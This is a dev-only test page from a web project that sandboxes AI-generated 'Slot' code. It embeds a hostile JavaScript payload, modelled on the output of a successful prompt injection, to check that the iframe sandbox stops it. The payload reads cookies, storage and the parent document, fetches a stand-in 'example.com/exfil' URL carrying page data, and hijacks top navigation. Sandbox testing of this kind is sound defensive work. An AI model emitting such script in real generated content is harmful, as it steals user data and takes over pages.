// A Slot carrying the code a successful prompt injection would produce, so
// the sandbox suite can be run against generated-shaped code rather than only
// against the benign fixture (docs/v1/plan/11-visuals-and-slot.md -> Verify:
// "the full sandbox suite from phase 04 re-run against a **generated** slot").
//
// The distinction matters. `full.json`'s Slot is code someone wrote to look
// like a product demo; it would pass the sandbox assertions even if the
// sandbox did nothing, because it never tries anything. This one tries
// everything — storage, cookies, the parent document, the network, top
// navigation — so the assertions are measuring the sandbox rather than the
// politeness of the payload.
//
// It is dev-only and never linked. `api/features/slot/generate.py`'s
// `check_slot` would refuse this code before it ever reached a scene; the
// point here is that the *sandbox* stops it even if that check did not, which
// is the layering the whole Slot design rests on.

import { SceneRenderer } from '@/features/renderer';
import { REDUCED_MOTION } from '@/features/art-direction';
import { seededArtDirection } from '@/features/art-direction/server';
import { sceneSchema } from '@/schema';

// The marker goes first, and every probe is wrapped. Found the hard way: in an
// opaque origin `document.cookie` *throws* rather than returning an empty
// string, so an unguarded read killed the rest of the payload and the suite
// failed for the wrong reason — the escapes were all refused, but the test
// could not tell that from "the script never ran". A payload that dies early
// makes a sandbox look perfect.
const HOSTILE_JS = `
  document.body.insertAdjacentHTML('beforeend', '<p id="ran">slot ran</p>');
  window.__escapes = {};
  try { window.localStorage.setItem('x', '1'); window.__escapes.storage = true; }
  catch { window.__escapes.storage = 'threw'; }
  try { window.__escapes.cookie = document.cookie; }
  catch { window.__escapes.cookie = 'threw'; }
  try { window.__escapes.parent = String(window.parent.document.title); }
  catch { window.__escapes.parent = 'threw'; }
  try {
    fetch('https://example.com/exfil?d=' + encodeURIComponent(document.title))
      .then(() => { window.__escapes.fetched = true; })
      .catch(() => { window.__escapes.fetched = 'threw'; });
  } catch { window.__escapes.fetched = 'threw'; }
  try { window.top.location = 'https://example.com/taken'; } catch { /* expected */ }
`;

const SCENE = sceneSchema.parse({
  id: 'hostile-slot',
  intent: 'reveal',
  layout: 'centered',
  blocks: [
    {
      id: 'slot-1',
      region: 'content',
      props: {
        type: 'slot',
        description: 'Hostile generated slot',
        height: 'auto',
        html: '<div class="box">generated</div>',
        css: '.box{color:var(--ink);background:var(--bg-elevated);padding:var(--space-4)}',
        js: HOSTILE_JS,
      },
    },
  ],
});

export default function HostileSlotPage() {
  return (
    <SceneRenderer
      scenes={[SCENE]}
      artDirection={seededArtDirection('cinematic-dark').artDirection}
      motion={REDUCED_MOTION}
    />
  );
}
